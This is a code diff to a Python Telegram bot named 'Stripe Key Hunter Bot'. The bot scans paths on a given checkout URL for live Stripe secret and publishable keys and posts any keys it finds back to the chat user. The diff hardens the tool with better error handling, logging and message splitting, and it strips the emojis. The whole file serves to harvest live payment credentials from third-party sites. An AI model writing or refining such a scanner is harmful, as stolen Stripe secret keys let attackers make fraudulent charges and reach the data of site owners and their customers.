@@ -29,8 +29,8 @@ def scan_for_keys(url):
     ]
 
     for path in paths:
+        full_url = url.rstrip("/") + path
         try:
-            full_url = url.rstrip("/") + path
             resp = requests.get(full_url, timeout=10)
             if resp.status_code == 200:
                 text = resp.text
@@ -40,7 +40,8 @@ def scan_for_keys(url):
                     found["sk"].extend(sk)
                 if pk:
                     found["pk"].extend(pk)
-        except:
+        except requests.RequestException as e:
+            logging.debug(f"Request to {full_url} failed: {e}")
             continue
 
     found["sk"] = list(set(found["sk"]))
@@ -50,49 +51,53 @@ def scan_for_keys(url):
 # === COMMANDS ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔥 Stripe Key Hunter Bot active.\n"
+        "Stripe Key Hunter Bot active.\n"
         "Send /scan <checkout_url> to extract keys.\n"
         "Example: /scan https://instantproxy.io/checkout"
     )
 
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("❌ Usage: /scan https://example.com/checkout")
+        await update.message.reply_text("Usage: /scan https://example.com/checkout")
         return
 
     url = context.args[0]
     if not url.startswith("http"):
         url = "https://" + url
 
-    await update.message.reply_text(f"🔍 Scanning: {url} ...")
+    await update.message.reply_text(f"Scanning: {url} ...")
 
     result = scan_for_keys(url)
 
-    reply = f"✅ Scan complete for: {url}\n\n"
+    reply = f"Scan complete for: {url}\n\n"
 
     if result["sk"]:
-        reply += "🔑 **Secret Keys (sk_live):**\n"
+        reply += "Secret Keys (sk_live):\n"
         for k in result["sk"]:
-            reply += f"`{k}`\n"
+            reply += f"{k}\n"
     else:
-        reply += "❌ No sk_live keys found.\n"
+        reply += "No sk_live keys found.\n"
 
     if result["pk"]:
-        reply += "\n🔓 **Publishable Keys (pk_live):**\n"
+        reply += "\nPublishable Keys (pk_live):\n"
         for k in result["pk"]:
-            reply += f"`{k}`\n"
+            reply += f"{k}\n"
     else:
-        reply += "\n❌ No pk_live keys found.\n"
+        reply += "\nNo pk_live keys found.\n"
 
-    await update.message.reply_text(reply)
+    # Telegram limits message length; split if needed
+    for chunk in [reply[i:i+4000] for i in range(0, len(reply), 4000)]:
+        await update.message.reply_text(chunk)
 
 # === MAIN ===
+
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("scan", scan))
-    print("🔥 Bot running on Railway...")
+    logging.info("Bot starting...")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
